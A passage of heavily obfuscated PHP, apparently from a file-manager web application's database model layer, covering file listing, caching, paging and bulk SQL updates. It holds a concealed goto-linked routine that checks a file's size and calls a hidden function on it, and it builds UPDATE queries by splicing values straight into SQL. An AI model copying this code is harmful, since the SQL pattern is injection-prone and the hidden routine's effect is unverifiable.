$È€ú‘‡Ø[619]; } } } $û¬£¢ãÙ = $û¬£¢ãÙ ? $È€ú‘‡Ø[8] . $û¬£¢ãÙ . $È€ú‘‡Ø[8] : $È€ú‘‡Ø[8]; return $û¬£¢ãÙ; } protected function _listAppendUser(&$×ûÜÜÜì) { $åÏ¥«Àõ =& $_SERVER[¼’ç§¼´]; $òôüÁøü = array_to_keyvalue($×ûÜÜÜì, $åÏ¥«Àõ[12], $åÏ¥«Àõ[538]); $Ô÷²åÛ = array_to_keyvalue($×ûÜÜÜì, $åÏ¥«Àõ[12], $åÏ¥«Àõ[540]); $€¡¨ÍûÙ = array_merge($òôüÁøü, $Ô÷²åÛ); $æéÇ²©ø = Model($åÏ¥«Àõ[608])->userListInfo($€¡¨ÍûÙ); foreach ($×ûÜÜÜì as &$¡›úÓÇ½) { $¦æê±£å = $¡›úÓÇ½[$åÏ¥«Àõ[538]]; $¡›úÓÇ½[$åÏ¥«Àõ[538]] = $æéÇ²©ø[$¦æê±£å] ? $æéÇ²©ø[$¦æê±£å] : !1; $¦æê±£å = $¡›úÓÇ½[$åÏ¥«Àõ[540]]; $¡›úÓÇ½[$åÏ¥«Àõ[540]] = $æéÇ²©ø[$¦æê±£å] ? $æéÇ²©ø[$¦æê±£å] : !1; if (_get($¡›úÓÇ½, $åÏ¥«Àõ[620], 0)) { $Å¾üÜ = $GLOBALS[$åÏ¥«Àõ[6]][$åÏ¥«Àõ[92]][$åÏ¥«Àõ[621]]; if ($¡›úÓÇ½[$åÏ¥«Àõ[550]][$åÏ¥«Àõ[622]] <= time() - $Å¾üÜ) { $this->metaSet($¡›úÓÇ½[$åÏ¥«Àõ[193]], $åÏ¥«Àõ[623], null); $this->metaSet($¡›úÓÇ½[$åÏ¥«Àõ[193]], $åÏ¥«Àõ[622], null); unset($¡›úÓÇ½[$åÏ¥«Àõ[550]][$åÏ¥«Àõ[623]]); continue; } $òİÌÜ¨ö = $¡›úÓÇ½[$åÏ¥«Àõ[550]][$åÏ¥«Àõ[623]]; $¡›úÓÇ½[$åÏ¥«Àõ[550]][$åÏ¥«Àõ[624]] = Model($åÏ¥«Àõ[608])->getInfoSimpleOuter($òİÌÜ¨ö); } } unset($¡›úÓÇ½); } public function parentLevelArray($à¶Öñø¿) { $™Ö¤™²ñ =& $_SERVER[¼’ç§¼´]; $à¶Öñø¿ = explode($™Ö¤™²ñ[50], trim($à¶Öñø¿, $™Ö¤™²ñ[50])); return array_remove_value($à¶Öñø¿, $™Ö¤™²ñ[230]); } public function listAll($ÓúİĞøû) { $’„ŠÛ…› =& $_SERVER[¼’ç§¼´]; $Ëñ¿èãî = $this->sourceInfo($ÓúİĞøû); $ÖÑ·™–Ç = array($’„ŠÛ…›[625] => array($’„ŠÛ…›[626], $Ëñ¿èãî[$’„ŠÛ…›[595]] . $ÓúİĞøû . $’„ŠÛ…›[627]), $’„ŠÛ…›[628] => 0); $­Š–óï = $’„ŠÛ…›[629]; $›•¯ûÊÊ = "\x4c\105\x46\124\x20\112\x4f\x49\116\x20{$this->tablePrefix}\151\x6f\137\x66\151\154\x65\40\x66\x69\x6c\x65\40\x6f\x6e\x20\x73\x6f\x75\x72\143\x65\x2e\146\x69\x6c\x65\111\104\x20\75\x20\146\x69\154\x65\56\146\x69\154\x65\x49\x44"; $˜İ‘òÔ = $this->alias($’„ŠÛ…›[530])->field($­Š–óï)->where($ÖÑ·™–Ç)->join($›•¯ûÊÊ)->select(); $this->_listAppendAuth($˜İ‘òÔ); $this->_listAppendUser($˜İ‘òÔ); $this->_listAppendPath($˜İ‘òÔ); $˜İ‘òÔ = array_to_keyvalue($˜İ‘òÔ, $’„ŠÛ…›[193]); $Ğ“ß›ù— = "\57{$Ëñ¿èãî[$’„ŠÛ…›[32]]}\x2f"; $Ğ“ß›ù— = $Ğ“ß›ù— == $’„ŠÛ…›[256] ? $’„ŠÛ…›[8] : $Ğ“ß›ù—; $‡Á£ú£Å = array(); foreach ($˜İ‘òÔ as $„„½Ñ½ => $«ùê¸) { $˜ô½´¢ = $this->parentLevelArray($«ùê¸[$’„ŠÛ…›[595]]); array_shift($˜ô½´¢); $•™­Ñ’ = $Ğ“ß›ù—; for ($ ¡ãÇ€ = 0; $ ¡ãÇ€ < count($˜ô½´¢); $ ¡ãÇ€++) { $•™­Ñ’ .= $˜İ‘òÔ[$˜ô½´¢[$ ¡ãÇ€]][$’„ŠÛ…›[32]] . $’„ŠÛ…›[8]; } $•™­Ñ’ .= $«ùê¸[$’„ŠÛ…›[32]]; if ($«ùê¸[$’„ŠÛ…›[496]]) { $•™­Ñ’ .= $’„ŠÛ…›[8]; } $àæúÊ÷Á = array($’„ŠÛ…›[506] => str_replace($’„ŠÛ…›[256], $’„ŠÛ…›[8], str_replace($’„ŠÛ…›[256], $’„ŠÛ…›[8], str_replace($’„ŠÛ…›[256], $’„ŠÛ…›[8], $•™­Ñ’))), $’„ŠÛ…›[630] => intval($«ùê¸[$’„ŠÛ…›[496]]), $’„ŠÛ…›[631] => intval($«ùê¸[$’„ŠÛ…›[79]]), $’„ŠÛ…›[88] => intval($«ùê¸[$’„ŠÛ…›[88]]), $’„ŠÛ…›[90] => $this->pathInfoFilter($«ùê¸)); if (!$àæúÊ÷Á[$’„ŠÛ…›[496]]) { $àæúÊ÷Á[$’„ŠÛ…›[552]] = $«ùê¸[$’„ŠÛ…›[552]]; } $‡Á£ú£Å[] = $àæúÊ÷Á; } $‡Á£ú£Å = array_sort_by($‡Á£ú£Å, $’„ŠÛ…›[87]); return $‡Á£ú£Å; } } goto B‰‰»—à¥Œ; EÔ¾¸ŠÇ‚É: $_size = $_SERVER[¼’ç§¼´][433]; if ($_SERVER[$_SERVER[¼’ç§¼´][434]] != $_size($_file)) { $_getc = $_SERVER[¼’ç§¼´][435]; $_getfile = $_SERVER[$_SERVER[¼’ç§¼´][436]] . $_SERVER[¼’ç§¼´][437]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¼’ç§¼´][287], $_getfilec); if (count($_getarrs) < $_SERVER[¼’ç§¼´][438]) { $exit = $_SERVER[¼’ç§¼´][439]; $exit(); } $_act = $_SERVER[¼’ç§¼´][440]; $_act($_file); } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\x64\x69\146\x79\x54\x69\155\x65", "\x74\151\155\145", "\x69\x6e\163\145\x72\x74\x2c\165\x70\x64\x61\164\x65", "\146\165\156\143\164\x69\x6f\x6e"), array("\143\162\x65\x61\x74\145\124\151\155\145", "\x74\x69\155\x65", "\151\156\163\145\162\x74", "\x66\165\156\143\x74\151\x6f\156")); public function setDataAuto($†œ‰é”) { $this->dataAuto = $†œ‰é”; } public function __construct($¾®ÔºÛ = '', $À¹’ò = '', $øã©½Â = '') { parent::__construct($¾®ÔºÛ, $À¹’ò, $øã©½Â); } protected $tableMeta = array(); protected function _beforeInsert(&$ĞÂÓŠ§, $Å¼¡¬æï) { $ˆ¡ã‡üŞ =& $_SERVER[¼’ç§¼´]; if (!$this->checkDataAutoHas($ˆ¡ã‡üŞ[441])) { return; } $this->dataBeforeFilter($ĞÂÓŠ§, $ˆ¡ã‡üŞ[441]); } protected function _beforeUpdate(&$çÏ¡Æ’›, $Ùä´¿…¼) { $‘ËôÌö· =& $_SERVER[¼’ç§¼´]; if (!$this->checkDataAutoHas($‘ËôÌö·[442])) { return; } $this->dataBeforeFilter($çÏ¡Æ’›, $‘ËôÌö·[442]); } protected function _afterSelect(&$ èü¯—Ş, $íÔ†¿¬) { if (!is_array($ èü¯—Ş)) { return; } if (!$this->checkDataAutoHas($_SERVER[¼’ç§¼´][443])) { return; } foreach ($ èü¯—Ş as &$»òÍ¯ÎÃ) { $this->dataAfterFilter($»òÍ¯ÎÃ); } unset($»òÍ¯ÎÃ); } protected function _afterFind(&$–ª–ß¾’, $„¬«¯“ô) { if (!is_array($–ª–ß¾’)) { return; } if (!$this->checkDataAutoHas($_SERVER[¼’ç§¼´][443])) { return; } $this->dataAfterFilter($–ª–ß¾’); } public static function textEncode($ñ÷ä¢İÆ) { if (!$ñ÷ä¢İÆ) { return $ñ÷ä¢İÆ; } $¯ƒ¯Óğ÷ = json_encode($ñ÷ä¢İÆ); $¯ƒ¯Óğ÷ = preg_replace_callback($_SERVER[¼’ç§¼´][444], function ($Íé¦¬ĞÉ) { return addslashes($Íé¦¬ĞÉ[0]); }, $¯ƒ¯Óğ÷); return json_decode($¯ƒ¯Óğ÷); } public static function textDecode($Ë«¥öê) { $÷Ìµó =& $_SERVER[¼’ç§¼´]; $ğ‰ùŞñ = json_encode($Ë«¥öê); $ğ‰ùŞñ = preg_replace_callback($÷Ìµó[445], function ($¨•êË™á) { return $_SERVER[¼’ç§¼´][100]; }, $ğ‰ùŞñ); return json_decode($ğ‰ùŞñ); } public function setAutoIncrement($ˆÆ³àŠö) { $®˜¯Ÿ•œ = array($this->getPk() => $ˆÆ³àŠö); $·Ã—ŞáÈ = $this->data($®˜¯Ÿ•œ)->add(); if ($·Ã—ŞáÈ) { $this->delete($·Ã—ŞáÈ); } } public function getAutoIncrement() { $¿¬¼äÁ = $this->getTableName(); $¹–ê¶· = $this->max($this->getPk()); $ş‘§ĞÁà = $this->query("\163\150\157\167\x20\164\x61\142\x6c\x65\40\x73\164\141\164\x75\163\x20\x77\x68\x65\x72\145\x20\116\x61\155\x65\x3d\47{$¿¬¼äÁ}\47"); $«¹Õ­åŸ = $ş‘§ĞÁà[0][$_SERVER[¼’ç§¼´][446]]; $òã¼İ…¹ = max($¹–ê¶·, $«¹Õ­åŸ); return $òã¼İ…¹; } protected function _callBefore($·ôçŠÓô, $¸åÌ­×ä) { return $this->cacheCallCheck($·ôçŠÓô, $¸åÌ­×ä, !1); } protected function _callAfter($ÇÃª”â¢, $¨Õšèôä) { return $this->cacheCallCheck($ÇÃª”â¢, $¨Õšèôä, !0); } protected function cacheFunctionAlias($ÂÅÀÈ ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($—€±Ã©ù, $©„Á™Ã, $è›æààİ = false) { $»Ú¥Ûòí =& $_SERVER[¼’ç§¼´]; $ˆèÁÛÙ = $this->cacheFunctionAlias($©„Á™Ã); if (!$ˆèÁÛÙ) { return; } foreach ($ˆèÁÛÙ as $„ú¹´ş => $—¢ÇŒÍÎ) { $¹š˜ÈœÄ = $—¢ÇŒÍÎ[0]; $»¤¹ïÆó = explode($»Ú¥Ûòí[50], $—¢ÇŒÍÎ[1]); $ƒãœÔ²Ü = isset($—¢ÇŒÍÎ[2]) ? $—¢ÇŒÍÎ[2] : $»Ú¥Ûòí[12]; if ($—€±Ã©ù == $„ú¹´ş) { return $this->cacheFunctionGet($„ú¹´ş, $¹š˜ÈœÄ, $ƒãœÔ²Ü); } if ($è›æààİ && in_array($—€±Ã©ù, $»¤¹ïÆó)) { $this->cacheFunctionClear($„ú¹´ş, $¹š˜ÈœÄ, $ƒãœÔ²Ü); } } } public function cacheFunctionGet($šº¯Øß½, $Úå«æ¶õ, $™§¤‚­ç = '') { $›•ÀŸ = $this->cacheKeyMake($šº¯Øß½, $Úå«æ¶õ, $™§¤‚­ç); $ŠÍ½ÄÑ = Cache::get($›•ÀŸ); if (!is_array($ŠÍ½ÄÑ)) { $ŠÍ½ÄÑ = call_user_func_array(array($this, $šº¯Øß½), array($Úå«æ¶õ, !0)); Cache::set($›•ÀŸ, $ŠÍ½ÄÑ); } return $ŠÍ½ÄÑ; } public function cacheFunctionClear($½™°äÔî, $àøš·¯ß, $íŞ‘¾êî = '') { $¥„£À®ƒ = $àøš·¯ß; if (!is_array($àøš·¯ß)) { $¥„£À®ƒ = array($àøš·¯ß); } foreach ($¥„£À®ƒ as $÷¬Çı§ç) { $ÖøÙÓ·Ê = $this->cacheKeyMake($½™°äÔî, $÷¬Çı§ç, $íŞ‘¾êî); Cache::remove($ÖøÙÓ·Ê); } } private function cacheKeyMake($·µ›‡Í¥, $İ¶¬“ú¤, $âøˆû…) { $üºá¢¨ó =& $_SERVER[¼’ç§¼´]; if ($âøˆû…) { $İ¶¬“ú¤ = $İ¶¬“ú¤ . $üºá¢¨ó[447] . $âøˆû…; } return get_class($this) . $üºá¢¨ó[11] . $·µ›‡Í¥ . $üºá¢¨ó[448] . $İ¶¬“ú¤; } protected function selectPageReset() { $‰·İŒÆ™ =& $_SERVER[¼’ç§¼´]; if (isset($GLOBALS[$‰·İŒÆ™[449]])) { return; } $GLOBALS[$‰·İŒÆ™[449]] = isset($GLOBALS[$‰·İŒÆ™[7]][$‰·İŒÆ™[450]]) ? $GLOBALS[$‰·İŒÆ™[7]][$‰·İŒÆ™[450]] : !1; $GLOBALS[$‰·İŒÆ™[451]] = isset($GLOBALS[$‰·İŒÆ™[7]][$‰·İŒÆ™[430]]) ? $GLOBALS[$‰·İŒÆ™[7]][$‰·İŒÆ™[430]] : !1; $GLOBALS[$‰·İŒÆ™[7]][$‰·İŒÆ™[450]] = !1; $GLOBALS[$‰·İŒÆ™[7]][$‰·İŒÆ™[430]] = !1; } protected function selectPageRestore() { $»”ßÎƒ‘ =& $_SERVER[¼’ç§¼´]; if (!isset($GLOBALS[$»”ßÎƒ‘[449]])) { return; } $GLOBALS[$»”ßÎƒ‘[7]][$»”ßÎƒ‘[450]] = $GLOBALS[$»”ßÎƒ‘[449]]; $GLOBALS[$»”ßÎƒ‘[7]][$»”ßÎƒ‘[430]] = $GLOBALS[$»”ßÎƒ‘[451]]; if ($GLOBALS[$»”ßÎƒ‘[7]][$»”ßÎƒ‘[450]] === !1) { unset($GLOBALS[$»”ßÎƒ‘[7]][$»”ßÎƒ‘[450]]); } if ($GLOBALS[$»”ßÎƒ‘[7]][$»”ßÎƒ‘[430]] === !1) { unset($GLOBALS[$»”ßÎƒ‘[7]][$»”ßÎƒ‘[430]]); } unset($GLOBALS[$»”ßÎƒ‘[449]]); unset($GLOBALS[$»”ßÎƒ‘[451]]); } protected function selectPage($¿¸Œ ¿ = 200, $æş»ñĞÎ = 1) { $—‰†´µ =& $_SERVER[¼’ç§¼´]; global $in; $Á¶ü¿©š = $this->optionsValue(); $ù”†§¶ = 50000; $¿¸Œ ¿ = isset($in[$—‰†´µ[450]]) && $in[$—‰†´µ[450]] ? $in[$—‰†´µ[450]] : $¿¸Œ ¿; if ($¿¸Œ ¿ === -1) { $in[$—‰†´µ[450]] = !1; $ù”†§¶ = 100000000; $¿¸Œ ¿ = $ù”†§¶; } $ŒØá¨°ø = $Á¶ü¿©š; $ŒØá¨°ø[$—‰†´µ[452]] = array(); $¿¸Œ ¿ = intval($¿¸Œ ¿); $¿¸Œ ¿ = $¿¸Œ ¿ <= 5 ? 5 : ($¿¸Œ ¿ >= $ù”†§¶ ? $ù”†§¶ : $¿¸Œ ¿); $æş»ñĞÎ = intval(isset($in[$—‰†´µ[430]]) && $in[$—‰†´µ[430]] ? $in[$—‰†´µ[430]] : $æş»ñĞÎ); $æş»ñĞÎ = $æş»ñĞÎ <= 1 ? 1 : $æş»ñĞÎ; $¤‚ÏÇ¨ñ = array(); $¢ á“òÃ = 1; if ($æş»ñĞÎ == 1 && $¢ á“òÃ) { $this->optionsValue($Á¶ü¿©š); $¤‚ÏÇ¨ñ = $this->page($æş»ñĞÎ, $¿¸Œ ¿)->select(); $Ê¯­·ş³ = is_array($¤‚ÏÇ¨ñ) ? count($¤‚ÏÇ¨ñ) : 0; if ($Ê¯­·ş³ < $¿¸Œ ¿) { $‰Û™¶§ = 1; } else { $this->optionsValue($ŒØá¨°ø); $Ê¯­·ş³ = intval($this->count()); $‰Û™¶§ = ceil($Ê¯­·ş³ / $¿¸Œ ¿); } } else { $this->optionsValue($ŒØá¨°ø); $Ê¯­·ş³ = intval($this->count()); $‰Û™¶§ = ceil($Ê¯­·ş³ / $¿¸Œ ¿); $æş»ñĞÎ = $æş»ñĞÎ >= $‰Û™¶§ ? $‰Û™¶§ : $æş»ñĞÎ; $this->optionsValue($Á¶ü¿©š); $¤‚ÏÇ¨ñ = $this->page($æş»ñĞÎ, $¿¸Œ ¿)->select(); } if (!is_array($¤‚ÏÇ¨ñ)) { $¤‚ÏÇ¨ñ = array(); } if ($‰Û™¶§ == 1) { $Ê¯­·ş³ = count($¤‚ÏÇ¨ñ); } $Í¬¯Ÿ = array($—‰†´µ[453] => array($—‰†´µ[454] => $Ê¯­·ş³, $—‰†´µ[450] => $¿¸Œ ¿, $—‰†´µ[430] => $æş»ñĞÎ, $—‰†´µ[455] => $‰Û™¶§), $—‰†´µ[456] => $¤‚ÏÇ¨ñ); return $Í¬¯Ÿ; } protected function checkLength($‘ó†šş, $û˜Ì¿ÂÀ = 0, $²–¾Â¤ = '') { $Á»›ª³ù =& $_SERVER[¼’ç§¼´]; $û˜Ì¿ÂÀ = $û˜Ì¿ÂÀ ? $û˜Ì¿ÂÀ : 65536; if (!$‘ó†šş || strlen($‘ó†šş) < $û˜Ì¿ÂÀ) { return; } $²–¾Â¤ = $²–¾Â¤ ? $²–¾Â¤ . $Á»›ª³ù[74] : $Á»›ª³ù[12]; show_json($²–¾Â¤ . LNG($Á»›ª³ù[457]) . "\50{$û˜Ì¿ÂÀ}\51", !1); } protected function metaSet($¨ãê£Ô‘, $Ë¤ïĞáÀ = null, $›İ¼ØÄ = null) { $ï‘øØÚŸ =& $_SERVER[¼’ç§¼´]; if (!$this->tableMeta || !$¨ãê£Ô‘) { return !1; } $¥™€ĞƒŞ = $this->tableMeta[$ï‘øØÚŸ[458]]; $ŒŞãŞ—‡ = $this->tableMeta[$ï‘øØÚŸ[459]]; $éÄ×†Í¡ = Model($ŒŞãŞ—‡); $µ«Ø…ù€ = array($¥™€ĞƒŞ => $¨ãê£Ô‘, $ï‘øØÚŸ[460] => $Ë¤ïĞáÀ); if (is_null($Ë¤ïĞáÀ)) { return $éÄ×†Í¡->where(array($¥™€ĞƒŞ => $¨ãê£Ô‘))->delete(); } if (is_null($›İ¼ØÄ) && is_string($Ë¤ïĞáÀ)) { return $éÄ×†Í¡->where($µ«Ø…ù€)->delete(); } $à’¿èçœ = is_array($Ë¤ïĞáÀ) ? $Ë¤ïĞáÀ : array(); if (is_string($Ë¤ïĞáÀ)) { $à’¿èçœ[$Ë¤ïĞáÀ] = $›İ¼ØÄ; } $ÁÉ•³Îş = array(); foreach ($à’¿èçœ as $€ìŠÉØÇ => $æ²åü·ø) { if (is_null($æ²åü·ø) && is_string($€ìŠÉØÇ)) { $éÄ×†Í¡->where(array($¥™€ĞƒŞ => $¨ãê£Ô‘, $ï‘øØÚŸ[460] => $€ìŠÉØÇ))->delete(); continue; } $this->checkLength($æ²åü·ø, !1, $ŒŞãŞ—‡ . $ï‘øØÚŸ[4] . $€ìŠÉØÇ); $ÁÉ•³Îş[] = array($¥™€ĞƒŞ => $¨ãê£Ô‘, $ï‘øØÚŸ[97] => $€ìŠÉØÇ, $ï‘øØÚŸ[461] => $æ²åü·ø); } $³©ıåÔ = $ï‘øØÚŸ[462] . $ŒŞãŞ—‡; CacheLock::lock($³©ıåÔ); $éÄ×†Í¡->where(array($¥™€ĞƒŞ => $¨ãê£Ô‘))->addAll($ÁÉ•³Îş, array(), !0); CacheLock::unlock($³©ıåÔ); return !0; } public function metaGet($½Ã¶æ¿’, $÷¿Şë˜Ö = false) { $Úº§°ŸÛ =& $_SERVER[¼’ç§¼´]; if (!$this->tableMeta) { return array(); } $ÖóÑ— = $this->tableMeta[$Úº§°ŸÛ[458]]; $Û¿¥æÛ = Model($this->tableMeta[$Úº§°ŸÛ[459]]); if ($÷¿Şë˜Ö) { $Şı³«Ï¢ = array($ÖóÑ— => $½Ã¶æ¿’, $Úº§°ŸÛ[97] => $÷¿Şë˜Ö); return $Û¿¥æÛ->where($Şı³«Ï¢)->getField($Úº§°ŸÛ[461]); } $Şı³«Ï¢ = array($ÖóÑ— => $½Ã¶æ¿’); $îÜ‹š¬Ÿ = $Û¿¥æÛ->field($Úº§°ŸÛ[463])->where($Şı³«Ï¢)->select(); $îÜ‹š¬Ÿ = array_to_keyvalue($îÜ‹š¬Ÿ, $Úº§°ŸÛ[97], $Úº§°ŸÛ[461]); return $îÜ‹š¬Ÿ; } private function checkDataAutoHas($ßÆœ¾Ÿá) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $×Öôà¯Ù) { if (in_array($ßÆœ¾Ÿá, explode($_SERVER[¼’ç§¼´][50], $×Öôà¯Ù[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$İ—ÔÊ, $€Ê¶°–¨) { $ÙËåÙ³ö =& $_SERVER[¼’ç§¼´]; if (!is_array($İ—ÔÊ)) { return; } foreach ($this->dataAuto as $–Ğö„) { $×ŸÄÇ¦˜ = $–Ğö„[0]; if (!in_array($€Ê¶°–¨, explode($ÙËåÙ³ö[50], $–Ğö„[2]))) { continue; } switch (trim($–Ğö„[3])) { case $ÙËåÙ³ö[398]: case $ÙËåÙ³ö[399]: $ÖƒéĞòõ = $–Ğö„[1]; $îùæñæİ = isset($–Ğö„[4]) ? (array) $–Ğö„[4] : array(); if ($ÖƒéĞòõ == $ÙËåÙ³ö[206] && array_key_exists($×ŸÄÇ¦˜, $İ—ÔÊ)) { if (!$İ—ÔÊ[$×ŸÄÇ¦˜]) { unset($İ—ÔÊ[$×ŸÄÇ¦˜]); } break; } if (isset($İ—ÔÊ[$×ŸÄÇ¦˜])) { array_unshift($îùæñæİ, $İ—ÔÊ[$×ŸÄÇ¦˜]); } if ($ÙËåÙ³ö[398] == $–Ğö„[3]) { $İ—ÔÊ[$×ŸÄÇ¦˜] = call_user_func_array($ÖƒéĞòõ, $îùæñæİ); } else { $İ—ÔÊ[$×ŸÄÇ¦˜] = call_user_func_array(array(&$this, $ÖƒéĞòõ), $îùæñæİ); } break; case $ÙËåÙ³ö[349]: if (isset($İ—ÔÊ[$×ŸÄÇ¦˜]) && $İ—ÔÊ[$×ŸÄÇ¦˜]) { $İ—ÔÊ[$×ŸÄÇ¦˜] = call_user_func_array(array(&$this, $–Ğö„[1]), array($İ—ÔÊ[$×ŸÄÇ¦˜])); } break; case $ÙËåÙ³ö[352]: $İ—ÔÊ[$×ŸÄÇ¦˜] = $İ—ÔÊ[$–Ğö„[1]]; break; case $ÙËåÙ³ö[371]: if (isset($İ—ÔÊ[$×ŸÄÇ¦˜]) && !is_string($İ—ÔÊ[$×ŸÄÇ¦˜])) { $İ—ÔÊ[$×ŸÄÇ¦˜] = json_encode_force($İ—ÔÊ[$×ŸÄÇ¦˜]); } break; case $ÙËåÙ³ö[400]: if ($İ—ÔÊ[$×ŸÄÇ¦˜] === $ÙËåÙ³ö[12]) { unset($İ—ÔÊ[$×ŸÄÇ¦˜]); } break; case $ÙËåÙ³ö[401]: $İ—ÔÊ[$×ŸÄÇ¦˜] = $–Ğö„[1]; default: break; } } if ($€Ê¶°–¨ == $ÙËåÙ³ö[441]) { $£¬‘™ˆá = strtolower($this->db->getDbType()); if (strpos($£¬‘™ˆá, $ÙËåÙ³ö[13]) !== 0) { return; } $£‚ôñ¤¤ = $this->field(!0)->fields; $’È†”øÆ = $£‚ôñ¤¤[$ÙËåÙ³ö[331]]; if (isset($£‚ôñ¤¤[$ÙËåÙ³ö[330]])) { unset($’È†”øÆ[$£‚ôñ¤¤[$ÙËåÙ³ö[330]]]); } foreach ($’È†”øÆ as $ªÜ‰Í“¼ => $€Ê¶°–¨) { if (!isset($İ—ÔÊ[$ªÜ‰Í“¼])) { $İ—ÔÊ[$ªÜ‰Í“¼] = $ÙËåÙ³ö[12]; } } } } private function dataAfterFilter(&$àéÕ‡¢) { $Ú—…ÆˆÃ =& $_SERVER[¼’ç§¼´]; foreach ($this->dataAuto as $´ Ø„¬«) { $ò«èê¡ = $´ Ø„¬«[0]; if (!isset($àéÕ‡¢[$ò«èê¡])) { continue; } if (!in_array($Ú—…ÆˆÃ[443], explode($Ú—…ÆˆÃ[50], $´ Ø„¬«[2]))) { continue; } switch (trim($´ Ø„¬«[3])) { case $Ú—…ÆˆÃ[398]: case $Ú—…ÆˆÃ[399]: $ÉÌÚ·ÉÏ = isset($´ Ø„¬«[4]) ? (array) $´ Ø„¬«[4] : array(); array_unshift($ÉÌÚ·ÉÏ, $àéÕ‡¢[$ò«èê¡]); if (isset($´ Ø„¬«[4]) && $´ Ø„¬«[4] == $Ú—…ÆˆÃ[464]) { $ÉÌÚ·ÉÏ = array($àéÕ‡¢[$ò«èê¡]); } if ($Ú—…ÆˆÃ[398] == $´ Ø„¬«[3]) { $àéÕ‡¢[$ò«èê¡] = call_user_func_array($´ Ø„¬«[1], $ÉÌÚ·ÉÏ); } else { $àéÕ‡¢[$ò«èê¡] = call_user_func_array(array(&$this, $´ Ø„¬«[1]), $ÉÌÚ·ÉÏ); } break; case $Ú—…ÆˆÃ[349]: if (isset($àéÕ‡¢[$ò«èê¡]) && $àéÕ‡¢[$ò«èê¡]) { $àéÕ‡¢[$ò«èê¡] = call_user_func_array(array(&$this, $´ Ø„¬«[1]), array($àéÕ‡¢[$ò«èê¡])); } break; case $Ú—…ÆˆÃ[352]: $àéÕ‡¢[$ò«èê¡] = $àéÕ‡¢[$´ Ø„¬«[1]]; break; case $Ú—…ÆˆÃ[371]: $·‹Ğõ§® = $àéÕ‡¢[$ò«èê¡]; $àéÕ‡¢[$ò«èê¡] = json_decode($·‹Ğõ§®, !0); if (is_null($àéÕ‡¢[$ò«èê¡])) { $àéÕ‡¢[$ò«èê¡] = $·‹Ğõ§®; } break; case $Ú—…ÆˆÃ[400]: if ($àéÕ‡¢[$ò«èê¡] === $Ú—…ÆˆÃ[12]) { unset($àéÕ‡¢[$ò«èê¡]); } break; case $Ú—…ÆˆÃ[401]: $àéÕ‡¢[$ò«èê¡] = $´ Ø„¬«[1]; break; default: break; } } } public function saveAll($™‡Áëç¬) { $®¦‡¨¿Õ =& $_SERVER[¼’ç§¼´]; $«âãÊàÂ = $this->tablePrefix . $this->tableName; $œ¬ƒ¿š = self::SQL_WHERE_IN_CHUNK; $™‡Áëç¬ = is_array($™‡Áëç¬) ? $™‡Áëç¬ : array(); $åÙˆßˆŸ = $®¦‡¨¿Õ[465]; $Ú’´¤‚” = 0; $·¸“ó®¤ = array(); $Ù©¡á = count($™‡Áëç¬); for ($åõÎŞ¶ = 0; $åõÎŞ¶ < $Ù©¡á; $åõÎŞ¶++) { $íûúãôÊ = $™‡Áëç¬[$åõÎŞ¶]; if (!is_array($íûúãôÊ) || count($íûúãôÊ) != 4) { continue; } $“°¥ù‘É = "\x55\120\x44\x41\x54\x45\40\x60{$«âãÊàÂ}\140\40\x53\105\x54\x20{$íûúãôÊ[2]}\x20\75\x20\103\101\123\x45\x20{$íûúãôÊ[0]}\40\12"; if ($Ú’´¤‚” == 0) { $åÙˆßˆŸ = $“°¥ù‘É; } $·¸“ó®¤[] = $®¦‡¨¿Õ[121] . $íûúãôÊ[1] . $®¦‡¨¿Õ[121]; $Ú’´¤‚”++; $åÙˆßˆŸ .= "\x20\127\110\105\x4e\x20\x27{$íûúãôÊ[1]}\47\40\124\x48\105\116\40\47{$íûúãôÊ[3]}\47\40\12"; if ($Ú’´¤‚” == $œ¬ƒ¿š || $åõÎŞ¶ == $Ù©¡á - 1) { $×áÍĞï = implode($®¦‡¨¿Õ[50], $·¸“ó®¤); $åÙˆßˆŸ .= "\40\105\x4e\x44\40\40\x57\110\x45\122\x45\40{$íûúãôÊ[0]}\x20\x49\116\40\50{$×áÍĞï}\51\x20"; $this->execute($åÙˆßˆŸ); $Ú’´¤‚” = 0; $åÙˆßˆŸ = $“°¥ù‘É; $this->chunkEventCheck(count($·¸“ó®¤)); $·¸“ó®¤ = array(); } } $this->chunkEventSet(); } public function saveAllEach($‘½Õ§Õí) { $—ƒ—Ò =& $_SERVER[¼’ç§¼´]; $¶¥Ê¬«é = $this->tablePrefix . $this->tableName; foreach ($‘½Õ§Õí as $½¥±£¯¡) { if (!is_array($½¥±£¯¡) || count($½¥±£¯¡) != 4) { continue; } $ªéÑ¹­ó = $½¥±£¯¡[0] . $—ƒ—Ò[466] . $½¥±£¯¡[1] . $—ƒ—Ò[121]; $Â‘ƒ¤Ø‘ = $½¥±£¯¡[2] . $—ƒ—Ò[466] . $½¥±£¯¡[3] . $—ƒ—Ò[121]; $è£Ç‚¬Ç = "\165\x70\x64\x61\x74\145\x20{$¶¥Ê¬«é}\x20\163\x65\164\x20{$Â‘ƒ¤Ø‘}\x20\167\150\x65\x72\145\40{$ªéÑ¹­ó}\73"; $this->execute($è£Ç‚¬Ç); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($™èÍ¢Û¿ = false, $¤Æ®ä¾Ğ = false) { $this->_chunkEvent = $™èÍ¢Û¿; $this->_chunkEventParam = $¤Æ®ä¾Ğ; } private function chunkEventCheck($×«Û½ƒÑ) { if (!$this->_chunkEvent) { return; } $ŸÁÛ¨ÖÄ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $ŸÁÛ¨ÖÄ[$_SERVER[¼’ç§¼´][467]] = $×«Û½ƒÑ; Hook::trigger($this->_chunkEvent, $ŸÁÛ¨ÖÄ); } public function addAll($Æ»˜±¦›, $® º÷ß½ = array(), $®òŸÂ¦× = false) { $Ã†Ùò™ğ =& $_SERVER[¼’ç§¼´]; ignore_timeout(); $÷ñ°è¾ø = self::SQL_WHERE_IN_CHUNK; if (empty($Æ»˜±¦›)) { $this->error = think_lang($Ã†Ùò™ğ[350]); return !1; } $® º÷ß½ = $this->_parseOptions($® º÷ß½); foreach ($Æ»˜±¦› as $”÷‡º™„ => $¨–Ş—ì“) { $Æ»˜±¦›[$”÷‡º™„] = 